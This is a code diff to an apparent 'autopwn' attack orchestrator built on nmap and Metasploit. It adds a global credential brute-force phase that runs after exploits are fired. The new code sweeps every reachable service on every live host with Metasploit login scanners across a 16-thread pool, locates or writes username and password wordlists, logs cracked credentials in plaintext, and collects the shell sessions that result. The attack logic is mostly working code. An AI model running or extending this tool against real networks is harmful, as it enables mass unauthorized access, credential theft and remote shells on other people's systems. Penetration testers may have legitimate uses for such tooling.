@@ -38,7 +38,9 @@ from dataclasses import dataclass
 from state import (RunState, HostState, Candidate, Verdict, TERMINAL_STATES,
                    is_exploitable_verdict, is_fireable_verdict)
 from scanner import Scanner, ScanConfig, NmapError, nse_scripts_for_cve
-from msf import MsfClient, MsfConfig, RANK_VALUES
+from msf import (MsfClient, MsfConfig, RANK_VALUES, BRUTE_USER_SEED,
+                 BRUTE_PASS_SEED, login_module_for, locate_wordlist,
+                 write_builtin_wordlists)
 from system import (preflight, PreflightError, FirewallManager, MsfdManager,
                     find_msfrpcd, resolve_run_as, ensure_runtime,
                     DEFAULT_VENV_DIR, RUNTIME_DEPS)
@@ -56,6 +58,7 @@ _RANK_ORDER = RANK_VALUES
 class OrchestratorConfig:
     workers: int = 10
     fire_workers: int = 8
+    brute_workers: int = 16          # concurrent (host, service) login scanners
     chunk_size: int = 2048
     checkpoint_interval: float = 15.0
     poll_interval: float = 0.25
@@ -109,6 +112,23 @@ class OrchestrationConfig:
         if data.get("msfrpcd_path") == path:
             return
         data["msfrpcd_path"] = path
+        data.setdefault("version", 1)
+        self._save(data)
+
+    def read_brute_wordlists(self):
+        """The stored (user_file, pass_file) absolute paths, or ("", "")."""
+        d = self._load()
+        u, p = d.get("brute_user_file", ""), d.get("brute_pass_file", "")
+        return (u if isinstance(u, str) else ""), (p if isinstance(p, str) else "")
+
+    def set_brute_wordlists(self, user_file, pass_file):
+        """Persist resolved wordlist paths so later runs skip the locate step."""
+        data = self._load()
+        if (data.get("brute_user_file") == user_file
+                and data.get("brute_pass_file") == pass_file):
+            return
+        data["brute_user_file"] = user_file
+        data["brute_pass_file"] = pass_file
         data.setdefault("version", 1)
         self._save(data)
 
@@ -186,15 +206,17 @@ class OrchestrationConfig:
 class Orchestrator:
     def __init__(self, run: RunState, scanner: Scanner, msf_client: MsfClient,
                  firewall: FirewallManager, msfd: MsfdManager,
-                 cfg: OrchestratorConfig):
+                 cfg: OrchestratorConfig, config_file: OrchestrationConfig = None):
         self.run = run
         self.scanner = scanner
         self.msf = msf_client
         self.fw = firewall
         self.msfd = msfd
         self.cfg = cfg
+        self.config_file = config_file or OrchestrationConfig()
         self._scan_pool = None
         self._fire_pool = None
+        self._brute_pool = None
         self._stop = threading.Event()
         self._teardown_done = False
         self._teardown_lock = threading.Lock()
@@ -218,7 +240,12 @@ class Orchestrator:
                     break
                 self._scan_pool.submit(self._process_host, ip)
             self._main_loop(display)
-            # Normal completion means the loop ended on _is_done, not a signal.
+            # The brute phase runs once the whole fire pipeline has drained, on a
+            # clean completion only (a signal skips it). autopwn-only: check mode
+            # has no fire step to follow.
+            if not self._stop.is_set() and self.run.mode == "autopwn":
+                self._brute_phase(display)
+            # Normal completion means we ended on _is_done, not a signal.
             self._completed = not self._stop.is_set()
         finally:
             self._teardown(display)
@@ -470,6 +497,111 @@ class Orchestrator:
             if self._is_done():
                 break
             time.sleep(self.cfg.poll_interval)
+
+    # -- brute phase --
+
+    def _brute_phase(self, display):
+        """One global credential-brute phase after the fire pipeline drains. Brutes
+        every accessible service on every live host with an MSF login scanner,
+        fanned across the brute pool, stop-on-first-success per service. Runs
+        regardless of exploit outcome: a working credential is its own finding,
+        and session-capable services open shells alongside the exploit sessions."""
+        targets = self._brute_targets()
+        if not targets:
+            return
+        self.run.set_phase("brute")
+        user_file, pass_file, temp_files = self._resolve_wordlists()
+        self.run.record_activity(
+            "brute", f"brute phase: {len(targets)} service(s), "
+                     f"users={os.path.basename(user_file)} "
+                     f"passwords={os.path.basename(pass_file)}")
+        self._brute_pool = ThreadPoolExecutor(
+            max_workers=self.cfg.brute_workers, thread_name_prefix="brute")
+        try:
+            futures = [self._brute_pool.submit(self._brute_wrapper, t,
+                                               user_file, pass_file)
+                       for t in targets]
+            self._await_brute(futures, display)
+        finally:
+            self._brute_pool.shutdown(wait=True)
+            for p in temp_files:
+                try:
+                    os.unlink(p)
+                except OSError:
+                    pass
+            self.run.save_checkpoint()
+
+    def _brute_targets(self):
+        """One (ip, service, login_module, port) per distinct login scanner on each
+        live host, lowest port first so SMB on 139/445 is bruted once."""
+        skip = (HostState.DOWN, HostState.QUEUED)
+        targets = []
+        for host in self.run.snapshot_hosts():
+            if host.state in skip or not host.services:
+                continue
+            seen = set()
+            for svc in sorted(host.services, key=lambda s: s.port):
+                module = login_module_for(svc.name, svc.port)
+                if not module or module in seen:
+                    continue
+                seen.add(module)
+                targets.append((host.ip, svc.name or "", module, svc.port))
+        return targets
+
+    def _brute_wrapper(self, target, user_file, pass_file):
+        if self._stop.is_set():
+            return
+        ip, service, module, port = target
+        with self.run.worker_slot():
+            try:
+                creds, sessions = self.msf.brute_service(
+                    service, module, ip, port, user_file, pass_file)
+                for c in creds:
+                    self.run.add_credential(ip, c)
+                    self.run.record_activity(
+                        "brute", f"{ip}:{port} {service} cred "
+                                 f"{c.username}:{c.password or '(blank)'}")
+                for s in sessions:
+                    self.run.add_session(ip, s)
+            except Exception as e:
+                logger.exception("brute failed for %s:%s (%s)", ip, port, service)
+                self.run.record_activity("brute", f"{ip}:{port} brute error: {e}")
+
+    def _await_brute(self, futures, display):
+        last_ckpt = time.time()
+        while not self._stop.is_set():
+            if display is not None:
+                try:
+                    display.refresh()
+                except Exception:
+                    logger.exception("display refresh error")
+            now = time.time()
+            if now - last_ckpt >= self.cfg.checkpoint_interval:
+                self.run.save_checkpoint()
+                last_ckpt = now
+            if all(f.done() for f in futures):
+                break
+            time.sleep(self.cfg.poll_interval)
+
+    def _resolve_wordlists(self):
+        """(user_file, pass_file, temp_files_to_clean). Prefer paths stored in the
+        config; else `locate` the seed files and store the hits; else fall back to
+        the built-in lists written to temp files (left out of the config so a
+        later run can find real lists once updatedb has run). A stored path that
+        has since vanished is treated as absent and re-resolved."""
+        user, passw = self.config_file.read_brute_wordlists()
+        if user and passw and os.path.isfile(user) and os.path.isfile(passw):
+            return user, passw, []
+        located_user = locate_wordlist(BRUTE_USER_SEED)
+        located_pass = locate_wordlist(BRUTE_PASS_SEED)
+        if located_user and located_pass:
+            self.config_file.set_brute_wordlists(located_user, located_pass)
+            logger.info("brute wordlists located: users=%s passwords=%s",
+                        located_user, located_pass)
+            return located_user, located_pass, []
+        u, p = write_builtin_wordlists()
+        logger.info("brute wordlists not found via locate; using built-in lists")
+        return u, p, [u, p]
 
     # -- teardown --
 
@@ -883,7 +1015,7 @@ def main(argv=None):
         workers=args.workers, fire_workers=args.fire_workers,
         chunk_size=args.chunk_size, checkpoint_interval=args.checkpoint_interval,
         keep_msfrpcd=args.keep_msfrpcd)
-    orch = Orchestrator(run, scanner, msf_client, fw, msfd, ocfg)
+    orch = Orchestrator(run, scanner, msf_client, fw, msfd, ocfg, cfgfile)
 
     display = None
     if not args.no_tui:
